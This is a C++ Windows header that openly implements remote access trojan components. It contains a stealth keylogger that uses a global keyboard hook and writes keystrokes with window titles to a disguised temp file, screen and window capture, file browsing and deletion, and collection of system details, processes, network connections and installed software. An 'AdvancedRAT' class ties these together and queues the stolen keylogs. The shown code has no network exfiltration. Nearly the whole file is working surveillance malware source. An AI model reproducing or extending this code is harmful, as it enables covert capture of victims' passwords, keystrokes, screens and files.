#pragma once
#include <windows.h>
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <shlobj.h>
#include <lm.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <mutex>
#include <chrono>
#include <map>
#include <queue>
#include <algorithm>

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "netapi32.lib")

using namespace Gdiplus;

// Structure for captured data
struct CapturedData {
    std::string type;
    std::string timestamp;
    std::vector<BYTE> data;
    std::map<std::string, std::string> metadata;
};

// Keylogger class
class StealthKeylogger {
private:
    static HHOOK hKeyboardHook;
    static std::string keyBuffer;
    static std::mutex bufferMutex;
    static bool isRunning;
    static std::string logFilePath;
    
public:
    static bool startKeylogging(const std::string& outputPath = "") {
        if (isRunning) return false;
        
        logFilePath = outputPath.empty() ? getTempPath() + "\\syslog.tmp" : outputPath;
        
        hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
        if (!hKeyboardHook) return false;
        
        isRunning = true;
        
        // Start background thread to save logs periodically
        std::thread([](){ saveLogsThread(); }).detach();
        
        return true;
    }
    
    static bool stopKeylogging() {
        if (!isRunning) return false;
        
        if (hKeyboardHook) {
            UnhookWindowsHookEx(hKeyboardHook);
            hKeyboardHook = NULL;
        }
        
        isRunning = false;
        saveCurrentBuffer();
        
        return true;
    }
    
    static std::string getKeyLogs() {
        std::lock_guard<std::mutex> lock(bufferMutex);
        return keyBuffer;
    }
    
    static void clearKeyLogs() {
        std::lock_guard<std::mutex> lock(bufferMutex);
        keyBuffer.clear();
    }
    
private:
    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string keyStr = translateKey(pKeyboard->vkCode);
            if (!keyStr.empty()) {
                std::lock_guard<std::mutex> lock(bufferMutex);
                
                // Add window title context
                static std::string lastWindow;
                std::string currentWindow = getCurrentWindowTitle();
                if (currentWindow != lastWindow) {
                    keyBuffer += "\n[" + getCurrentTimestamp() + "] Window: " + currentWindow + "\n";
                    lastWindow = currentWindow;
                }
                
                keyBuffer += keyStr;
            }
        }
        
        return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
    }
    
    static std::string translateKey(DWORD vkCode) {
        switch (vkCode) {
            case VK_SPACE: return " ";
            case VK_RETURN: return "\n";
            case VK_TAB: return "[TAB]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_DELETE: return "[DELETE]";
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_CAPITAL: return "[CAPS]";
            case VK_ESCAPE: return "[ESC]";
            case VK_UP: return "[UP]";
            case VK_DOWN: return "[DOWN]";
            case VK_LEFT: return "[LEFT]";
            case VK_RIGHT: return "[RIGHT]";
            default: {
                // Get actual character
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                
                WORD result;
                int ret = ToAscii(vkCode, MapVirtualKey(vkCode, 0), keyboardState, &result, 0);
                if (ret == 1) {
                    return std::string(1, (char)result);
                }
                return "";
            }
        }
    }
    
    static std::string getCurrentWindowTitle() {
        HWND hwnd = GetForegroundWindow();
        char title[256];
        GetWindowTextA(hwnd, title, sizeof(title));
        return std::string(title);
    }
    
    static std::string getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        char buffer[100];
        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localtime(&time_t));
        return std::string(buffer);
    }
    
    static std::string getTempPath() {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        return std::string(tempPath);
    }
    
    static void saveLogsThread() {
        while (isRunning) {
            std::this_thread::sleep_for(std::chrono::minutes(5));
            saveCurrentBuffer();
        }
    }
    
    static void saveCurrentBuffer() {
        std::lock_guard<std::mutex> lock(bufferMutex);
        if (!keyBuffer.empty()) {
            std::ofstream file(logFilePath, std::ios::app);
            if (file.is_open()) {
                file << keyBuffer;
                file.close();
                keyBuffer.clear();
            }
        }
    }
};

// Static member definitions
HHOOK StealthKeylogger::hKeyboardHook = NULL;
std::string StealthKeylogger::keyBuffer = "";
std::mutex StealthKeylogger::bufferMutex;
bool StealthKeylogger::isRunning = false;
std::string StealthKeylogger::logFilePath = "";

// Screen capture class
class ScreenCapture {
private:
    ULONG_PTR gdiplusToken;
    
public:
    ScreenCapture() {
        GdiplusStartupInput gdiplusStartupInput;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    }
    
    ~ScreenCapture() {
        GdiplusShutdown(gdiplusToken);
    }
    
    std::vector<BYTE> captureScreen(int quality = 75) {
        std::vector<BYTE> result;
        
        // Get screen dimensions
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        // Create device contexts
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        
        // Create bitmap
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        // Copy screen to bitmap
        BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
        
        // Convert to GDI+ bitmap
        Bitmap* bitmap = new Bitmap(hBitmap, NULL);
        
        // Save to memory stream
        IStream* stream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &stream);
        
        // Set JPEG encoder parameters
        CLSID jpegClsid;
        GetEncoderClsid(L"image/jpeg", &jpegClsid);
        
        EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG qualityValue = quality;
        encoderParams.Parameter[0].Value = &qualityValue;
        
        if (bitmap->Save(stream, &jpegClsid, &encoderParams) == Ok) {
            // Get stream data
            HGLOBAL hGlobal;
            GetHGlobalFromStream(stream, &hGlobal);
            
            SIZE_T size = GlobalSize(hGlobal);
            BYTE* data = (BYTE*)GlobalLock(hGlobal);
            
            if (data) {
                result.assign(data, data + size);
                GlobalUnlock(hGlobal);
            }
        }
        
        // Cleanup
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        
        return result;
    }
    
    std::vector<BYTE> captureWindow(HWND hwnd, int quality = 75) {
        std::vector<BYTE> result;
        
        RECT rect;
        if (!GetWindowRect(hwnd, &rect)) return result;
        
        int width = rect.right - rect.left;
        int height = rect.bottom - rect.top;
        
        HDC hWindowDC = GetDC(hwnd);
        HDC hMemoryDC = CreateCompatibleDC(hWindowDC);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hWindowDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        PrintWindow(hwnd, hMemoryDC, PW_RENDERFULLCONTENT);
        
        Bitmap* bitmap = new Bitmap(hBitmap, NULL);
        
        IStream* stream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &stream);
        
        CLSID jpegClsid;
        GetEncoderClsid(L"image/jpeg", &jpegClsid);
        
        EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG qualityValue = quality;
        encoderParams.Parameter[0].Value = &qualityValue;
        
        if (bitmap->Save(stream, &jpegClsid, &encoderParams) == Ok) {
            HGLOBAL hGlobal;
            GetHGlobalFromStream(stream, &hGlobal);
            
            SIZE_T size = GlobalSize(hGlobal);
            BYTE* data = (BYTE*)GlobalLock(hGlobal);
            
            if (data) {
                result.assign(data, data + size);
                GlobalUnlock(hGlobal);
            }
        }
        
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(hwnd, hWindowDC);
        
        return result;
    }
    
private:
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0;
        UINT size = 0;
        
        ImageCodecInfo* pImageCodecInfo = NULL;
        
        GetImageEncodersSize(&num, &size);
        if (size == 0) return -1;
        
        pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
        if (pImageCodecInfo == NULL) return -1;
        
        GetImageEncoders(num, size, pImageCodecInfo);
        
        for (UINT j = 0; j < num; ++j) {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return j;
            }
        }
        
        free(pImageCodecInfo);
        return -1;
    }
};

// File operations class
class FileOperations {
public:
    static std::vector<std::string> listDirectory(const std::string& path, bool recursive = false) {
        std::vector<std::string> files;
        
        WIN32_FIND_DATAA findData;
        std::string searchPath = path + "\\*";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return files;
        
        do {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                std::string fullPath = path + "\\" + findData.cFileName;
                files.push_back(fullPath);
                
                if (recursive && (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    auto subFiles = listDirectory(fullPath, true);
                    files.insert(files.end(), subFiles.begin(), subFiles.end());
                }
            }
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
        return files;
    }
    
    static std::vector<BYTE> readFile(const std::string& filePath) {
        std::vector<BYTE> data;
        
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) return data;
        
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE) {
            CloseHandle(hFile);
            return data;
        }
        
        data.resize(fileSize);
        DWORD bytesRead;
        
        if (ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL)) {
            data.resize(bytesRead);
        } else {
            data.clear();
        }
        
        CloseHandle(hFile);
        return data;
    }
    
    static bool writeFile(const std::string& filePath, const std::vector<BYTE>& data) {
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        DWORD bytesWritten;
        bool success = WriteFile(hFile, data.data(), data.size(), &bytesWritten, NULL);
        
        CloseHandle(hFile);
        return success && (bytesWritten == data.size());
    }
    
    static bool deleteFile(const std::string& filePath) {
        return DeleteFileA(filePath.c_str());
    }
    
    static bool moveFile(const std::string& source, const std::string& destination) {
        return MoveFileA(source.c_str(), destination.c_str());
    }
    
    static bool copyFile(const std::string& source, const std::string& destination) {
        return CopyFileA(source.c_str(), destination.c_str(), FALSE);
    }
    
    static std::vector<std::string> findFiles(const std::string& directory, 
                                            const std::string& pattern, 
                                            bool recursive = true) {
        std::vector<std::string> matches;
        
        auto files = listDirectory(directory, recursive);
        for (const auto& file : files) {
            if (file.find(pattern) != std::string::npos) {
                matches.push_back(file);
            }
        }
        
        return matches;
    }
};

// System information gathering
class SystemInfo {
public:
    static std::map<std::string, std::string> getSystemInformation() {
        std::map<std::string, std::string> info;
        
        // Computer name
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            info["computer_name"] = computerName;
        }
        
        // Username
        char username[UNLEN + 1];
        size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            info["username"] = username;
        }
        
        // OS version
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        if (GetVersionExA((OSVERSIONINFOA*)&osvi)) {
            info["os_version"] = std::to_string(osvi.dwMajorVersion) + "." + 
                               std::to_string(osvi.dwMinorVersion) + "." + 
                               std::to_string(osvi.dwBuildNumber);
        }
        
        // System directory
        char sysDir[MAX_PATH];
        if (GetSystemDirectoryA(sysDir, MAX_PATH)) {
            info["system_directory"] = sysDir;
        }
        
        // Processor architecture
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        info["processor_architecture"] = std::to_string(sysInfo.wProcessorArchitecture);
        info["processor_count"] = std::to_string(sysInfo.dwNumberOfProcessors);
        
        // Memory information
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        if (GlobalMemoryStatusEx(&memStatus)) {
            info["total_memory"] = std::to_string(memStatus.ullTotalPhys);
            info["available_memory"] = std::to_string(memStatus.ullAvailPhys);
        }
        
        return info;
    }
    
    static std::vector<std::map<std::string, std::string>> getRunningProcesses() {
        std::vector<std::map<std::string, std::string>> processes;
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::map<std::string, std::string> process;
                process["pid"] = std::to_string(pe32.th32ProcessID);
                process["name"] = pe32.szExeFile;
                process["ppid"] = std::to_string(pe32.th32ParentProcessID);
                process["threads"] = std::to_string(pe32.cntThreads);
                
                // Get additional process information
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                                            FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char processPath[MAX_PATH];
                    if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH)) {
                        process["path"] = processPath;
                    }
                    
                    PROCESS_MEMORY_COUNTERS pmc;
                    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                        process["memory_usage"] = std::to_string(pmc.WorkingSetSize);
                    }
                    
                    CloseHandle(hProcess);
                }
                
                processes.push_back(process);
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return processes;
    }
    
    static std::vector<std::map<std::string, std::string>> getNetworkConnections() {
        std::vector<std::map<std::string, std::string>> connections;
        
        PMIB_TCPTABLE_OWNER_PID pTcpTable;
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        
        // Get size needed
        dwRetVal = GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, 
                                      TCP_TABLE_OWNER_PID_ALL, 0);
        
        if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
            pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
            if (pTcpTable) {
                dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, 
                                              TCP_TABLE_OWNER_PID_ALL, 0);
                
                if (dwRetVal == NO_ERROR) {
                    for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
                        std::map<std::string, std::string> conn;
                        
                        struct in_addr localAddr, remoteAddr;
                        localAddr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
                        remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
                        
                        conn["protocol"] = "TCP";
                        conn["local_address"] = inet_ntoa(localAddr);
                        conn["local_port"] = std::to_string(ntohs((u_short)pTcpTable->table[i].dwLocalPort));
                        conn["remote_address"] = inet_ntoa(remoteAddr);
                        conn["remote_port"] = std::to_string(ntohs((u_short)pTcpTable->table[i].dwRemotePort));
                        conn["state"] = std::to_string(pTcpTable->table[i].dwState);
                        conn["pid"] = std::to_string(pTcpTable->table[i].dwOwningPid);
                        
                        connections.push_back(conn);
                    }
                }
                
                free(pTcpTable);
            }
        }
        
        return connections;
    }
    
    static std::vector<std::string> getInstalledSoftware() {
        std::vector<std::string> software;
        
        const char* uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
        HKEY hKey;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD index = 0;
            char subKeyName[256];
            DWORD subKeyNameSize = sizeof(subKeyName);
            
            while (RegEnumKeyExA(hKey, index++, subKeyName, &subKeyNameSize, 
                                NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char displayName[256];
                    DWORD displayNameSize = sizeof(displayName);
                    
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, 
                                        (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
                        software.push_back(displayName);
                    }
                    
                    RegCloseKey(hSubKey);
                }
                
                subKeyNameSize = sizeof(subKeyName);
            }
            
            RegCloseKey(hKey);
        }
        
        return software;
    }
};

// Main RAT features coordinator
class AdvancedRAT {
private:
    StealthKeylogger keylogger;
    ScreenCapture screenCapture;
    std::queue<CapturedData> dataQueue;
    std::mutex queueMutex;
    bool isRunning;
    
public:
    AdvancedRAT() : isRunning(false) {}
    
    bool startRAT() {
        if (isRunning) return false;
        
        isRunning = true;
        
        // Start keylogger
        keylogger.startKeylogging();
        
        // Start background data collection thread
        std::thread([this](){ dataCollectionThread(); }).detach();
        
        return true;
    }
    
    bool stopRAT() {
        if (!isRunning) return false;
        
        isRunning = false;
        keylogger.stopKeylogging();
        
        return true;
    }
    
    std::vector<CapturedData> getCollectedData() {
        std::lock_guard<std::mutex> lock(queueMutex);
        
        std::vector<CapturedData> data;
        while (!dataQueue.empty()) {
            data.push_back(dataQueue.front());
            dataQueue.pop();
        }
        
        return data;
    }
    
    CapturedData captureScreenshot() {
        CapturedData data;
        data.type = "screenshot";
        data.timestamp = getCurrentTimestamp();
        data.data = screenCapture.captureScreen();
        data.metadata["format"] = "jpeg";
        data.metadata["quality"] = "75";
        
        return data;
    }
    
    CapturedData getSystemInfo() {
        CapturedData data;
        data.type = "system_info";
        data.timestamp = getCurrentTimestamp();
        
        auto sysInfo = SystemInfo::getSystemInformation();
        std::string jsonData = "{";
        for (const auto& pair : sysInfo) {
            jsonData += "\"" + pair.first + "\":\"" + pair.second + "\",";
        }
        if (!jsonData.empty() && jsonData.back() == ',') {
            jsonData.pop_back();
        }
        jsonData += "}";
        
        data.data.assign(jsonData.begin(), jsonData.end());
        
        return data;
    }
    
private:
    void dataCollectionThread() {
        while (isRunning) {
            // Collect various data periodically
            
            // Collect keylog data every 30 seconds
            static auto lastKeylogCollection = std::chrono::steady_clock::now();
            auto now = std::chrono::steady_clock::now();
            
            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeylogCollection).count() >= 30) {
                std::string keyLogs = keylogger.getKeyLogs();
                if (!keyLogs.empty()) {
                    CapturedData data;
                    data.type = "keylog";
                    data.timestamp = getCurrentTimestamp();
                    data.data.assign(keyLogs.begin(), keyLogs.end());
                    
                    std::lock_guard<std::mutex> lock(queueMutex);
                    dataQueue.push(data);
                    
                    keylogger.clearKeyLogs();
                }
                lastKeylogCollection = now;
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
    
    std::string getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        char buffer[100];
        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localtime(&time_t));
        return std::string(buffer);
    }
};